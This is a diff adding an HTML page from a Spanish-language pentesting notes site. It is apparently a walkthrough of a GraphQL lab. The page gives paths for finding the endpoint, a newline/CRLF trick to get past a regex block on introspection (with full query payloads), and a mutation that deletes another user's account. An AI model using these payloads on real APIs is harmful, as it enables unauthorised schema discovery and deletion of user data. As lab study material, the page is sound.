@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Si la instrospección está habilitada : https://github.com/APIs-guru/graphql-voyager&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Si la instrospección está habilitada : https://github.com/APIs-guru/graphql-voyager</p>
+
+<p>Buscamos el endpoint usando GET y POST</p>
+
+<p>/graphql
+/graphiql
+/graphql.php
+/graphql/console
+/api
+/api/graphql
+/graphql/api
+/graphql/graphql</p>
+
+<p>y poniendo /v1 y usando application/json</p>
+
+<p>Usando una query universal : <code class="language-plaintext highlighter-rouge">query{__typename}</code></p>
+
+<p>Si le enviamos una Introspection query :</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"errors"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"locations"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
+      </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"GraphQL introspection is not allowed, but the query contained __schema or __type"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Ahora vamos a bypassear la defensa contra instrospección:</p>
+
+<h2 id="bypassing-graphql-introspection-defenses">Bypassing GraphQL introspection defenses</h2>
+
+<p>If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the <code class="language-plaintext highlighter-rouge">__schema</code> keyword.</p>
+
+<p>When developers disable introspection, they could use a regex to exclude the <code class="language-plaintext highlighter-rouge">__schema</code> keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.</p>
+
+<p>As such, if the developer has only excluded <code class="language-plaintext highlighter-rouge">__schema{</code>, then the below introspection query would not be excluded.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+    </span><span class="err">#Introspection</span><span class="w"> </span><span class="err">query</span><span class="w"> </span><span class="err">with</span><span class="w"> </span><span class="err">newline</span><span class="w">
+
+    </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"query{__schema
+        {queryType{name}}}"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>If this doesn’t work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of <code class="language-plaintext highlighter-rouge">x-www-form-urlencoded</code>.</p>
+
+<p>The example below shows an introspection probe sent via GET, with URL-encoded parameters.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> # Introspection probe as GET request
+    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+</code></pre></div></div>
+
+<p>Solución : 
+Si lo enviamos así nos da error</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"query { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Si lo enviamos así (salto de línea y retorno de carro después de __schema) :</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"query { __schema</span><span class="se">\r\n</span><span class="s2">
+     { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Funciona</p>
+
+<p>Enviando</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"query { getUser(id: 1) { id username  } }"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"getUser"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"administrator"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>==Para eliminar al usuario con Id=3==</p>
+
+<p>Dado que el tipo de respuesta <code class="language-plaintext highlighter-rouge">DeleteOrganizationUserResponse</code> tiene un campo llamado <code class="language-plaintext highlighter-rouge">user</code> que es de tipo <code class="language-plaintext highlighter-rouge">User</code>, puedes solicitar información adicional sobre el usuario eliminado al hacer la mutación <code class="language-plaintext highlighter-rouge">deleteOrganizationUser</code>. Aquí tienes un ejemplo de cómo realizar la mutación para eliminar un usuario y obtener información sobre el usuario eliminado en la respuesta.</p>
+
+<h3 id="ejemplo-de-mutación-deleteorganizationuser">Ejemplo de mutación <code class="language-plaintext highlighter-rouge">deleteOrganizationUser</code></h3>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mutation { deleteOrganizationUser(input: { id : 3 }) { user { id username } } }"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="explicación">Explicación</h3>
+
+<ul>
+  <li><strong>deleteOrganizationUser</strong>: Es el nombre de la mutación que elimina al usuario.</li>
+  <li><strong>input</strong>: Es el argumento que necesita la mutación, y debe seguir la estructura de <code class="language-plaintext highlighter-rouge">DeleteOrganizationUserInput</code>. ==(indicar un id)==
+    <ul>
+      <li><strong>id</strong>: El identificador del usuario que deseas eliminar. Sustituye <code class="language-plaintext highlighter-rouge">123</code> por el ID real del usuario.</li>
+    </ul>
+  </li>
+  <li><strong>user</strong>: Este campo en la respuesta representa el usuario que fue eliminado ==(debe seguir la estructura de DeleteOrganizationUserResponse)==
+    <ul>
+      <li>**id, username Campos de información del usuario eliminado que solicitamos como ejemplo. Puedes cambiar o agregar otros campos según lo permita el tipo <code class="language-plaintext highlighter-rouge">User</code> en tu esquema.</li>
+    </ul>
+  </li>
+</ul>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
